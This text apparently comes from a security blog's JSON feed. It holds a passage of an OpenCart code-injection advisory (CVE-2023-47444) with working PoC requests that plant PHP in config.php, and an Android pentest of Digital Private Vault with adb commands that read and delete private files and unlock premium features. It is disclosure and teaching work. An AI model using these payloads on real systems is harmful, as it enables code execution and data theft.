'define(\\'HTTP_SERVER\\', \\'' . // [4]                     substr(                          HTTP_SERVER,                          0,                          strrpos(HTTP_SERVER, '/admin/')                         ) . '/' . $name . '/\\');' . \"\\n\";                      $status = false;                 }                  if (strpos($line, 'define(\\'DIR_APPLICATION') !== false) {                     $output .= 'define(\\'DIR_APPLICATION\\', DIR_OPENCART . \\'' . $name . // [5]                     '/\\');' . \"\\n\";                      $status = false;                 }                  if ($status) {                     $output .= $line;                 }             }             // ...         }     }     // ... }   At [1] the new admin directory name is read from the incoming HTTP GET request and stored inside the $name PHP variable. Also in this case, a regex is applied in order to remove special untrusted characters, but it is badly implemented and so does nothing. As for the storage() function, also in this case basename() 1 is used on the supplied name parameter, preventing us from using the / character inside it.   At [2], after having verified the authenticated user has the write privilege for common/security, the application checks if the admin/ or the new folder exists and also that config.php and admin/config.php have writable privileges. If no error has occurrs, the application creates the new folder [3] and moves all the files from the old admin path to the newer one.  Finally, at [4] and [5], it replaces inside the new config.php the old HTTP_SERVER and DIR_APPLICATION variables with the new path, without performing any further checks on the variables.  In a normal scenario, the admin/ directory will be moved to a newer directory under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject two new HTTP_SERVER and DIR_APPLICATION paths inside the configuration file containing special characters that allow escaping the define() function and add arbitrary PHP code.  Exploit Conditions and Prerequisites  Both the vulnerabilities can be exploited if the attacker has valid credentials for the backend dashboard with the write permission on common/security. Furthermore, an additional pre-requisite is needed to exploit the admin() function (common/security.admin), whereby the admin/ folder must be the default one and must not have been previously renamed.  Proof-of-Concept  PoC for common/security.storage  The vulnerability in common/security.storage can be exploited by sending two GET requests.     The PoC do not fix the mismatch between the DIR_STORAGE variable written inside config.php and the actual folder created on disk (/home/kali/Projects/OpenCart/4.0.2.3/pwned'\\'');phpinfo();#). This means that the PoC completely breaks the application. Be aware of this.   The first request has to be sent to: route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=&lt;opencart_base_folder&gt;&amp;user_token=&lt;user_token&gt;  GET /admin_secret/index.php?route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=/home/kali/Projects/OpenCart/4.0.2.3/&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad HTTP/1.1 Host: 127.0.0.1:8888 Cookie: OCSESSID=fbc47c7e5098550f0c12070be0  --- RESPONSE ---  HTTP/1.1 200 OK  {\"next\":\"http:\\/\\/127.0.0.1:8888\\/admin_secret\\/index.php?route=common\\/security.storage&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&amp;name=pwned');phpinfo();#&amp;path=\\/home\\/kali\\/Projects\\/OpenCart\\/4.0.2.3\\/&amp;page=2\"}   The second one to: route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=&lt;opencart_base_folder&gt;&amp;user_token=&lt;user_token&gt;&amp;page=99  GET /admin_secret/index.php?route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=/home/kali/Projects/OpenCart/4.0.2.3/&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&amp;page=99 HTTP/1.1 Host: 127.0.0.1:8888 Cookie: OCSESSID=fbc47c7e5098550f0c12070be0  --- RESPONSE ---  HTTP/1.1 200 OK  {\"success\":\"Success: Storage directory has been moved!\"}   Now every page will include the poisoned config.php file, executing the injected code (in our case the phpinfo() function):    Demo:    PoC for common/security.admin  The vulnerability in common/security.admin can also be exploited by sending two different GET requests.  The first one to: route=common/security.admin&amp;user_token=&lt;token&gt;&amp;page=1&amp;name=foo%27);phpinfo();print(%27  GET /admin/index.php?route=common/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;page=1&amp;name=foo%27);phpinfo();print(%27 HTTP/1.1 Host: 127.0.0.1:8888 Cookie: OCSESSID=fbc47c7e5098550f0c12070be0  --- RESPONSE ---  HTTP/1.1 200 OK  {\"next\":\"http:\\/\\/127.0.0.1:8888\\/admin\\/index.php?route=common\\/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;name=foo');phpinfo();print('&amp;page=2\"}   The second one to: route=common/security.admin&amp;user_token=&lt;token&gt;&amp;page=99&amp;name=foo%27);phpinfo();print(%27  GET /admin/index.php?route=common/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;page=99&amp;name=foo%27);phpinfo();print(%27 HTTP/1.1 Host: 127.0.0.1:8888 Cookie: OCSESSID=fbc47c7e5098550f0c12070be0  --- RESPONSE ---  HTTP/1.1 200 OK  {\"redirect\":\"http:\\/\\/127.0.0.1:8888\\/foo');phpinfo();print('\\/index.php?route=common\\/login\"}    In this case, a new directory containing the poinsoned config.php file will be created:    Demo:    Mitigations and hotfix  Fixing the misconfigured regexes (pull reqeust #12949) should prevent the exploitation in both the scenarios: }  if (isset($this-&gt;request-&gt;get['name'])) { -    $name = preg_replace('[^a-zA-Z0-9_]', '', basename(html_entity_decode(trim($this-&gt;request-&gt;get['name']), ENT_QUOTES, 'UTF-8'))); +    $name = preg_replace('/[^a-zA-Z0-9_]/', '', basename(html_entity_decode(trim($this-&gt;request-&gt;get['name']), ENT_QUOTES, 'UTF-8'))); } else {     $name = ''; }  if (isset($this-&gt;request-&gt;get['path'])) { -    $path = preg_replace('[^a-zA-Z0-9_\\:\\/]', '', html_entity_decode(trim($this-&gt;request-&gt;get['path']), ENT_QUOTES, 'UTF-8')); +    $path = preg_replace('/[^a-zA-Z0-9_\\:\\/]/', '', html_entity_decode(trim($this-&gt;request-&gt;get['path']), ENT_QUOTES, 'UTF-8')); } else {     $path = ''; } @@ -282,7 +282,7 @@ public function admin(): void { }  if (isset($this-&gt;request-&gt;get['name'])) { -    $name = preg_replace('[^a-zA-Z0-9]', '', basename(html_entity_decode(trim((string)$this-&gt;request-&gt;get['name']), ENT_QUOTES, 'UTF-8'))); +    $name = preg_replace('/[^a-zA-Z0-9]/', '', basename(html_entity_decode(trim((string)$this-&gt;request-&gt;get['name']), ENT_QUOTES, 'UTF-8'))); } else {     $name = 'admin'; }   Furthermore, disable the common/security role for every user until a patch will be available. 16/11/2023 update: A partial fix only affecting the storage function (#12951) has been merged to master.  Disclosure Timeline    Please refer to the disclosure policy page for further details about the disclosure policy adopted by 0xbro.      14/10/2023: Discovered both the vulnerabilities in opencart/upload/admin/controller/common/security.php   17/10/2023: Contacted OpenCart at support@opencart.com (without receiving any response).   24/10/2023: Contacted OpenCart at webmaster@opencart.com.   30/10/2023: Following the official guidelines, published a post on the official OpenCart forum.   02/11/2023: Sent a PM to an Administrator on the official OpenCart forum.   10/11/2023: Assigned CVE-2023-47444   10/11/2023: Sent a PM to another Administrator on the official OpenCart forum as a very last resort to contact the OpenCart staff.   11/11/2023: Get a kindly response from an OpenCart Administrator    14/11/2023: Public release and opened a GitHub issue (#12947)   15/11/2023: Opened a pull request (#12949) with a hotfix, but closed immediately by administrator. GitHub issue also closed by administrator after having marked it as spam and a ‚Äúnon vulnerability‚Äù.   16/11/2023: Partial fix - only affecting the storage function (#12951) merged to master                    basename, php.net¬†&#8617;&#xfe0e;¬†&#8617;&#xfe0e;2                 CVE-2011-3763, nvd.nist.gov¬†&#8617;&#xfe0e;                 CVE-2013-1891, security.snyk.io¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "Digital Private Vault (APK) - Subverting an (in)secure Android vault",
    "url": "/posts/digital-private-vault/",
    "categories": "Disclosed Vulnerabilities",
    "tags": "android",
    "date": "2023-06-29 00:00:00 +0200",
    "content": "Product details     Application   Digital Private Vault   Official website   www.digitalprivatevault.com   Company   Techuz   Version   1.6   Downloads   10K+   Package   com.techuz.privatevault   Min. Android version   5.0 (API level 21)     Introduction  It is well known that Google Play does not verify applications uploaded to the store, making it quite common to run into apps that are supposed to ensure user security and privacy, but actually do anything but that. Some of these applications even have to be purchased or require the user to pay for the full version.  While I was looking for some of these applications, I came across Digital Private Vault.  Quoting the official description of the application:    Digital Private Vault is a simple yet smart private photo vault app that allows you to hide all your personal data in one place. [‚Ä¶] Digital Private Vault will work as your vault app for your Android phone and tablet that safeguards your personal data.   Among the most important features, Digital Private Vault allows its users to store their images, videos, and notes inside multiple private areas, each one protected with a common 4-digit PIN (mmmmh‚Ä¶) and a folder-specific password.      It is also important to notice that some features are currently broken because the back-end server (52.15.243.62) has been compromised at some point in the past 1 but never repaired:  $ mongo 52.15.243.62       MongoDB shell version v6.0.1 connecting to: mongodb://52.15.243.62:27017/test?compressors=disabled&amp;gssapiServiceName=mongodb Implicit session: session { \"id\" : UUID(\"0b3b883d-448b-4246-bd95-6b4b060a4c16\") } MongoDB server version: 4.0.12 ... &gt; show dbs; READ__ME_TO_RECOVER_YOUR_DATA  0.000GB admin                          0.000GB angularfullstack               0.000GB config                         0.000GB &gt; use READ__ME_TO_RECOVER_YOUR_DATA switched to db READ__ME_TO_RECOVER_YOUR_DATA &gt; show collections; README &gt; db.README.find() { \"_id\" : ObjectId(\"6488e1bdcfa44d6e4a22abf2\"),  \"content\" : \"All your data was backed up. You need to email us at rambler+1rhcl@onionmail.org to recover your data.  (more information: go to https://cutt.ly/recdb1) ALLWAYS CHECK YOUR SPAM FOLDER! OR YOU MAY MISS OUR MAILS If you dont answer we will leak and expose all your data and in 48hs delete it forever from our server.\"  }   Information gathering  The application has been tested using a rooted Android 10 emulator (read How to set up an Android Penetration Testing Lab from scratch 2 for more details about the configuration).  .\\sdkmanager.bat --install \"system-images;android-29;google_apis;x86\" .\\avdmanager.bat --verbose create avd --force --name \"generic_api29_google_apis_emulator\" --package \"system-images;android-29;google_apis;x86\" --tag \"google_apis\" --abi \"x86\" .\\emulator.exe -avd generic_28   To get a quick overview of the application, we scanned the APK with MobSF 3, which reported the following high-level summary with lots of other details:    By decompiling the application with jadx-gui 4 we noticed that the source code was not obfuscated at all, helping us a lot with the analysis.    AndroidManifest.xml  From the AndroidManifest.xml file we can extract some very interesting information (detected also with MobSF).     The application uses clear-text traffic:   &lt;application android:theme=\"@style/AppTheme\"  ... android:name=\"com.techuz.privatevault.PrivateVaultApp\" android:allowBackup=\"false\"  ... android:usesCleartextTraffic=\"true\" ... &gt;    MobSF finding     There are two components explicitly exported 5:   &lt;provider android:name=\"com.techuz.privatevault.widget.ContentProviders.MyFileContentProvider\"  android:enabled=\"true\" android:exported=\"true\" android:authorities=\"com.techuz.privatevault\"/&gt; ... &lt;activity android:name=\"com.facebook.CustomTabActivity\" android:exported=\"true\"&gt;     &lt;intent-filter&gt;         &lt;action android:name=\"android.intent.action.VIEW\"/&gt;         &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt;         &lt;category android:name=\"android.intent.category.BROWSABLE\"/&gt;         &lt;data android:scheme=\"fbconnect\" android:host=\"cct.com.techuz.privatevault\"/&gt;     &lt;/intent-filter&gt; &lt;/activity&gt;   MobSF finding     There is one component implicity exported 6:   &lt;receiver android:name=\"com.techuz.privatevault.service.MyBroadcastReceiver\"&gt;     &lt;intent-filter&gt;         &lt;action android:name=\"serviceEnds\"/&gt;     &lt;/intent-filter&gt; &lt;/receiver&gt;   MobSF finding  Internal folder structure  The initial folder structure immediately after installing the application is as follows: generic_x86:/ ## ls -al /data/data/com.techuz.privatevault/ total 44 drwx------   4 u0_a155 u0_a155       4096 2023-06-13 14:34 . drwxrwx--x 182 system  system        8192 2023-06-13 14:34 .. drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 cache drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 code_cache lrwxrwxrwx   1 root    root            70 2023-06-13 14:34 lib -&gt; /data/app/com.techuz.privatevault-m5oxNSMIZSbq3NXMMvdXFg==/lib/x86  generic_x86:/data/data/com.techuz.privatevault ## find . ./cache ./code_cache ./lib   After starting the application for the first time and setting up email and pin, the folder structure becomes the one below: generic_x86:/ ## ls -al /data/data/com.techuz.privatevault/ total 68 drwx------   7 u0_a155 u0_a155       4096 2023-06-13 14:36 . drwxrwx--x 182 system  system        8192 2023-06-13 14:34 .. drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 cache drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 code_cache drwxrwx--x   2 u0_a155 u0_a155       4096 2023-06-13 14:36 databases drwxrwx--x   3 u0_a155 u0_a155       4096 2023-06-13 14:36 files lrwxrwxrwx   1 root    root            70 2023-06-13 14:34 lib -&gt; /data/app/com.techuz.privatevault-m5oxNSMIZSbq3NXMMvdXFg==/lib/x86 drwxrwx--x   2 u0_a155 u0_a155       4096 2023-06-13 14:36 shared_prefs  generic_x86:/data/data/com.techuz.privatevault ## find . ./cache ./code_cache ./lib ./files ./files/.com.google.firebase.crashlytics ./files/.com.google.firebase.crashlytics/log-files ./files/.com.google.firebase.crashlytics/log-files/crashlytics-userlog-648862BF028B0001300D8713FF69C011.temp ./files/.com.google.firebase.crashlytics/report-persistence ./files/.com.google.firebase.crashlytics/report-persistence/sessions ./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011 ./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011/report ./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011/start-time ./files/.com.google.firebase.crashlytics/com.crashlytics.settings.json ./files/generatefid.lock ./files/PersistedInstallation.W0RFRkFVTFRd+MTo1Nzk3OTA4MDI0ODM6YW5kcm9pZDozMGNkMjJjMTU4MDVjNDRlY2M5ZDQ2.json ./shared_prefs ./shared_prefs/com.facebook.sdk.appEventPreferences.xml ./shared_prefs/com.google.android.gms.measurement.prefs.xml ./shared_prefs/com.google.firebase.crashlytics.xml ./shared_prefs/FirebaseAppHeartBeat.xml ./shared_prefs/com.techuz.privatevault_preferences.xml ./shared_prefs/PV.xml ./databases ./databases/com.google.android.datatransport.events ./databases/com.google.android.datatransport.events-journal ./databases/google_app_measurement_local.db ./databases/google_app_measurement_local.db-journal   Vulnerabilities  Cleartext storage of sensitive information     The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.   The first thing I did after setting up the vault was search for hardcoded secrets inside the application folder. In our case, the PIN, the personal email, and the password were good candidates, so I started grepping for those, discovering that they are stored as they are, without any encryption or protection.  The user‚Äôs email, as well as the PIN, are stored within /shared_prefs/PV.xml: generic_x86:/data/data/com.techuz.privatevault ## grep -r \"1234\" . ./shared_prefs/PV.xml:    &lt;string name=\"PASSCODE\"&gt;1234&lt;/string&gt; generic_x86:/data/data/com.techuz.privatevault ## grep -r \"0xbro.red\" . ./shared_prefs/PV.xml:    &lt;string name=\"PV_EMAIL\"&gt;0xbro.red@yopmail.com&lt;/string&gt; generic_x86:/data/data/com.techuz.privatevault ## cat ./shared_prefs/PV.xml &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt; &lt;map&gt;     &lt;string name=\"PV_EMAIL\"&gt;0xbro.red@yopmail.com&lt;/string&gt;     &lt;string name=\"PASSCODE\"&gt;1234&lt;/string&gt; &lt;/map&gt;   Album‚Äôs passwords, instead, are stored inside an SQLite database: generic_x86:/data/data/com.techuz.privatevault ## grep -r \"s3cr3t!\" . Binary file ./databases/MyDBName.db matches 1|generic_x86:/data/data/com.techuz.privatevault ## sqlite3 ./databases/MyDBName.db SQLite version 3.22.0 2018-12-19 01:30:22 Enter \".help\" for usage hints. sqlite&gt; .tables Files             SubDirectory      android_metadata Notes sqlite&gt; select * from SubDirectory; 1|1|Secret Album|/data/user/0/com.techuz.privatevault/app_privateVault/images/Secret Album|s3cr3t!   After finding out how the application saved pins and passwords, I wondered how ‚Äúsecret‚Äù pictures and notes were saved. I imported an image into an album, created a new note, and started searching in the same way as I did before.  The folder structure now looks like this:  generic_x86:/data/data/com.techuz.privatevault ## ls -al total 92 drwx------  10 u0_a156 u0_a156       4096 2023-06-13 14:58 . drwxrwx--x 182 system  system        8192 2023-06-13 14:41 .. drwxrwx--x   4 u0_a156 u0_a156       4096 2023-06-13 14:58 app_privateVault drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 14:43 app_textures drwx------   3 u0_a156 u0_a156       4096 2023-06-13 14:43 app_webview drwxrws--x   5 u0_a156 u0_a156_cache 4096 2023-06-13 14:58 cache drwxrws--x   2 u0_a156 u0_a156_cache 4096 2023-06-13 14:41 code_cache drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 14:58 databases drwxrwx--x   3 u0_a156 u0_a156       4096 2023-06-13 14:43 files lrwxrwxrwx   1 root    root            70 2023-06-13 14:41 lib -&gt; /data/app/com.techuz.privatevault-9Z6nlf_ZcpzYg8akloQUYQ==/lib/x86 drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 16:11 shared_prefs   Photos and videos imported inside the vault are simply stored within app_privateVault without any kind of protection: generic_x86:/data/data/com.techuz.privatevault ## find app_privateVault/ app_privateVault/ app_privateVault/images app_privateVault/images/Secret Album app_privateVault/images/Secret Album/1686661132501.jpg app_privateVault/images/Secret Album/1686661147557.jpg app_privateVault/images/Secret Album/1686661447174.jpg app_privateVault/videos   Notes, on the other hand, are saved in the same SQLite file (MyDBName.db) where we found album passwords: 1|generic_x86:/data/data/com.techuz.privatevault ## grep -r secret . Binary file ./databases/MyDBName.db matches 1|generic_x86:/data/data/com.techuz.privatevault ## sqlite3 ./databases/MyDBName.db SQLite version 3.22.0 2018-12-19 01:30:22 Enter \".help\" for usage hints. sqlite&gt; select * from notes; 1|Find me if you can.|This is a secret notes that should not be read by anyone|2023-06-13 03:57:17 PM   Looking at the strings.xml file, you can also find some hardcoded API key: $ cat privateVault/res/values/strings.xml ... &lt;string name=\"google_api_key\"&gt;AIzaSyDth7hjwe8p-redacted-&lt;/string&gt; &lt;string name=\"google_app_id\"&gt;1:579790802483:android:30cd22c15805c44ecc9d46&lt;/string&gt; &lt;string name=\"google_crash_reporting_api_key\"&gt;AIzaSyDth7hjwe8p-redacted-&lt;/string&gt; &lt;string name=\"google_storage_bucket\"&gt;digital-private-vault.appspot.com&lt;/string&gt; ...   Cleartext transmission of sensitive information     The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.   The application allows users to get forgotten PINs or passwords through their email. That information, however, is communicated to the server using an unencrypted channel (as for all other communications to the server), exposing them to third parties.  The application first checks that the email is the same as the one used by the user during registration (stored locally inside shared_prefs/PV.xml): private boolean inputValidation(String email) {     if (email.isEmpty()) {         this.et_email.setError(\"Email is required\");         this.et_email.requestFocus();         return false;     } else if (!Patterns.EMAIL_ADDRESS.matcher(email).matches()) {         this.et_email.setError(\"Invalid email\");         this.et_email.requestFocus();         return false;     } else if (Utility.getStringPreference(this, Constants.PREF_KEY_EMAIL, \"\").equals(email)) {         return true;     } else {         Toast.makeText(this, \"Entered email does not match to registered email\", 0).show();         return false;     } }  Then it sends the HTTP POST request to the server (52.15.243.62:3000) containing the private information within the body: public void callForgotPasswordApi(String email) {     showProgressDialog(this);     APIService client = getClient(Constants.BASE_URL);     HashMap hashMap = new HashMap();     hashMap.put(\"email\", email);     if (this.albumName != null &amp;&amp; this.albumPasscode != null) {         Log.d(\"AlbumName\", \"********** AlbumName : \" + this.albumName + \" **************************\");         Log.d(\"Passcode\", \"********** Passcode : \" + this.albumPasscode + \" **************************\");         hashMap.put(\"album_name\", this.albumName);         hashMap.put(\"passcode\", this.albumPasscode);         hashMap.put(\"device_name\", Utility.getDeviceName());         hashMap.put(\"device_os\", \"Android\");         try {             hashMap.put(\"app_version\", getPackageManager().getPackageInfo(getPackageName(), 0).versionName);         } catch (PackageManager.NameNotFoundException e) {             e.printStackTrace();         }         Log.e(\"\", \"device_name:\" + Utility.getDeviceName());         try {             Log.e(\"\", \"app_version:\" + getPackageManager().getPackageInfo(getPackageName(), 0).versionName);         } catch (PackageManager.NameNotFoundException unused) {         }     } else {         String string = getSharedPreferences(Constants.NOTIFICATION_CHANNEL_ID, 0).getString(\"PASSCODE\", \"\");         Log.d(\"Passcode\", \"********** Passcode : \" + string + \" **************************\");         hashMap.put(\"passcode\", string);         hashMap.put(\"device_name\", Utility.getDeviceName());         hashMap.put(\"device_os\", \"Android\");         try {             hashMap.put(\"app_version\", getPackageManager().getPackageInfo(getPackageName(), 0).versionName);         } catch (PackageManager.NameNotFoundException e2) {             e2.printStackTrace();         }         Log.e(\"\", \"device_name:\" + Utility.getDeviceName());         try {             Log.e(\"\", \"app_version:\" + getPackageManager().getPackageInfo(getPackageName(), 0).versionName);         } catch (PackageManager.NameNotFoundException e3) {             e3.printStackTrace();         }     }   The resulting HTTP request is the following one:  POST /api/forgotpass HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 163 Host: 52.15.243.62:3000 Connection: close Accept-Encoding: gzip, deflate User-Agent: okhttp/3.12.1  device_name=Google%20Android%20SDK%20built%20for%20x86&amp;app_version=1.6&amp;album_name=Secret%20Album&amp;device_os=Android&amp;email=0xbro.red%40yopmail.com&amp;passcode=s3cr3t%21  Sensitive data leakage in log files     The application stores passwords and pins inside logs, exposing them to unathorized actors.   The application writes inside logs every HTTP request sent to the server. Because sensitive information is sent inside those requests, the same information is also stored inside logs, allowing anyone with physical access to the device to obtain them:  generic_x86:/data/data/com.techuz.privatevault/shared_prefs ## logcat | grep passcode 06-14 11:09:02.227  4067  7800 D OkHttp  : device_name=Google%20Android%20SDK%20built%20for%20x86&amp;app_version=1.6&amp;device_os=Android&amp;email=0xbro.red%40yopmail.com&amp;passcode=1234 06-14 16:45:54.337 12997 13608 D OkHttp  : device_name=Google%20Android%20SDK%20built%20for%20x86&amp;app_version=1.6&amp;album_name=asdf&amp;device_os=Android&amp;email=0xbro%40yopmail.com&amp;passcode=asdf   Premium feature unlock (insecure authorization)     The application checks whether a user is a ‚ÄúPro‚Äù member from a local configuration file, which in some cases can be modified.   Some of the application‚Äôs various features, such as wireless syncing or unlimited photo vault, were only available to ‚ÄúPro‚Äù users. Currently, upgrading to Pro does not work anymore. However, looking at the source code, we can still find a way to ‚Äúelevate‚Äù our feature pool.  By default, the application allows you to create up to 5 different albums, after which it requires you to upgrade to the pro version:    Searching inside the source code for this message we end up in the ImagesFragment class. Here we can notice that the application checks ImagesFragment.this.isProMember to verify if the user is a Pro member.  /* renamed from: com.techuz.privatevault.ui.fragments.ImagesFragment */ /* loaded from: classes2.dex */ public class ImagesFragment extends BaseActivity implements DirectoryAdapter.OnHideLayoutInteraction { ... @Override // android.view.View.OnClickListener public void onClick(View view) { \tif (ImagesFragment.this.mDirList.size() &lt; 5 || ImagesFragment.this.isProMember) { \t\t// do \"Pro\" user reserved stuff \t} \tImagesFragment imagesFragment = ImagesFragment.this; \timagesFragment.showAlertDialog(imagesFragment, \"Want to create more albums?\", \"Upgrade to pro and create unlimited albums!\"); } }); ... }   ImagesFragment extends BaseActivity, so we can look inside this class to understand how the value is decreed. We discover that BaseActivity set isProMember depending on appPreferenceManager:  /* renamed from: com.techuz.privatevault.ui.activities.BaseActivity */ public class BaseActivity extends AppCompatActivity { ... public boolean isProMember = false; ... @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         this.myPrefs = getSharedPreferences(Constants.NOTIFICATION_CHANNEL_ID, 0);         AppPreferenceManager appPreferenceManager = new AppPreferenceManager(this);         this.prefManager = appPreferenceManager;         this.isProMember = appPreferenceManager.isProMember();         this.dbHelperClass = new DbHelperClass(this);         this.mEmailRegistrationReceiver = new EmailRegistrationReceiver();     } }      AppPreferenceManager 7 simply returns a true/false value according to what is contained within the configuration file (shared_prefs/com.techuz.privatevault_preferences.xml) interfacing with mPrefs 8: public class AppPreferenceManager { ... private static final String IS_PRO_MEMBER = \"isProMember\"; private final SharedPreferences mPrefs; ... public boolean isProMember() { \treturn this.mPrefs.getBoolean(IS_PRO_MEMBER, false); } ... }   So, to summarize: we can arbitrarily change our ‚Äúmembership‚Äù by editing/adding the isProMember field within shared_prefs/com.techuz.privatevault_preferences.xml, as done below (make sure to remove any cached data):     This change is only possible via a rooted device   &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt; &lt;map&gt;     &lt;boolean name=\"IsFirstTimeLaunch\" value=\"false\" /&gt;     &lt;boolean name=\"isEmailSet\" value=\"true\" /&gt;     &lt;int name=\"total_count\" value=\"20\" /&gt;     &lt;boolean name=\"isEmailRegistered\" value=\"false\" /&gt;     &lt;boolean name=\"isRateGiven\" value=\"true\" /&gt;     &lt;boolean name=\"isProMember\" value=\"true\" /&gt; &lt;/map&gt;      Arbitrary file interaction using an exported content provider     The application exports a content provider which manages private files, allowing anyone to read or delete them.   As we saw from both MobSF and the AndroidManifest.xml file, the application exports a content provider (MyFileContentProvider) which can be used by anyone:  &lt;provider android:name=\"com.techuz.privatevault.widget.ContentProviders.MyFileContentProvider\"  android:enabled=\"true\" android:exported=\"true\" android:authorities=\"com.techuz.privatevault\"/&gt;   The MyFileContentProvider class exposes the content://com.techuz.privatevault/ interface and extends ContentProvider 9.  public class MyFileContentProvider extends ContentProvider {     public static final Uri CONTENT_URI = Uri.parse(\"content://com.techuz.privatevault/\");     private static final HashMap&lt;String, String&gt; MIME_TYPES;     public static String PATH;     Context mContext; ...   The class also overrides many different functions derived from ContentProvider, providing a custom implementation for some of them and ‚Äúdisabling‚Äù others: @Override // android.content.ContentProvider     public boolean onCreate() {         return true;     }  ...  @Override // android.content.ContentProvider public String getType(Uri uri) {     String uri2 = uri.toString();     for (String str : MIME_TYPES.keySet()) {         if (uri2.endsWith(str)) {             return MIME_TYPES.get(str);         }     }     return null; }  @Override // android.content.ContentProvider public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {     File file;     if (uri.getPath() != null &amp;&amp; !uri.getPath().isEmpty() &amp;&amp; !uri.getPath().equals(\"/\")) {         file = new File(uri.getPath());     } else {         file = new File(PATH);     }     if (file.exists()) {         return ParcelFileDescriptor.open(file, C1099C.ENCODING_PCM_32BIT);     }     throw new FileNotFoundException(uri.getPath()); }  @Override // android.content.ContentProvider public Cursor query(Uri url, String[] projection, String selection, String[] selectionArgs, String sort) {     throw new RuntimeException(\"Operation not supported\"); }  @Override // android.content.ContentProvider public Uri insert(Uri uri, ContentValues initialValues) {     throw new RuntimeException(\"Operation not supported\"); }  @Override // android.content.ContentProvider public int update(Uri uri, ContentValues values, String where, String[] whereArgs) {     throw new RuntimeException(\"Operation not supported\"); }  @Override // android.content.ContentProvider public int delete(Uri uri, String where, String[] whereArgs) {     new File(uri.getPath()).delete();     this.mContext.getContentResolver().notifyChange(uri, null);     return 1; }   We can interact with every overridden method, but because both delete() and openFile() has a custom and useful logic, those are the one we are more interested in. Using adb shell content we can communicate with both methods and because the provider is exported and there are no security measures in place, we can use them to read and delete arbitrary files stored within /data/data/com.techuz.privatevault.  PS &gt; .\\platform-tools\\adb.exe shell ls /data/data/com.techuz.privatevault/shared_prefs ... PV.xml ... PS &gt; .\\platform-tools\\adb.exe shell content read --uri content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt; &lt;map&gt;     &lt;string name=\"PV_EMAIL\"&gt;0xbro@yopmail.com&lt;/string&gt;     &lt;string name=\"PASSCODE\"&gt;0000&lt;/string&gt; &lt;/map&gt; PS &gt; .\\platform-tools\\adb.exe shell content delete --uri content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml  ## even if we get an error, the file is still deleted Error while accessing provider:com.techuz.privatevault java.lang.NullPointerException: Attempt to invoke virtual method 'android.content.ContentResolver android.content.Context.getContentResolver()' on a null object reference         at android.os.Parcel.createException(Parcel.java:2077)         at android.os.Parcel.readException(Parcel.java:2039)         at android.database.DatabaseUtils.readExceptionFromParcel(DatabaseUtils.java:188)         at android.database.DatabaseUtils.readExceptionFromParcel(DatabaseUtils.java:140)         at android.content.ContentProviderProxy.delete(ContentProviderNative.java:553)         at com.android.commands.content.Content$DeleteCommand.onExecute(Content.java:525)         at com.android.commands.content.Content$Command.execute(Content.java:469)         at com.android.commands.content.Content.main(Content.java:690)         at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)         at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:338) PS &gt; .\\platform-tools\\adb.exe shell content read --uri content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml Error while accessing provider:com.techuz.privatevault java.io.FileNotFoundException: /data/data/com.techuz.privatevault/shared_prefs/PV.xml         at android.database.DatabaseUtils.readExceptionWithFileNotFoundExceptionFromParcel(DatabaseUtils.java:149)         at android.content.ContentProviderProxy.openFile(ContentProviderNative.java:604)         at com.android.commands.content.Content$ReadCommand.onExecute(Content.java:587)         at com.android.commands.content.Content$Command.execute(Content.java:469)         at com.android.commands.content.Content.main(Content.java:690)         at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)         at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:338)   In this way we can retrieve pins, passwords and any other secrets hidden by the application.  Other general misconfiguration  Other than the vulnerabilities we listed above, the application has many other misconfigurations and bugs that do not pose a real threat to the application/user but still allow unintended actions to take place.  The exported MyBroadcastReceiver, for example, can be used to send customized download notifications to the user:  public class MyBroadcastReceiver extends BroadcastReceiver {     ...     @Override // android.content.BroadcastReceiver     public void onReceive(Context context, Intent intent) {         int intExtra = intent.getIntExtra(\"numCallbacks\", -1);         String stringExtra = intent.getStringExtra(\"notificationTitle\");         String stringExtra2 = intent.getStringExtra(\"notificationMessage\");         if (intExtra == 0) {             boolean booleanExtra = intent.getBooleanExtra(\"serviceRunningForImages\", false);             this.serviceWorkingForImages = booleanExtra;             if (booleanExtra 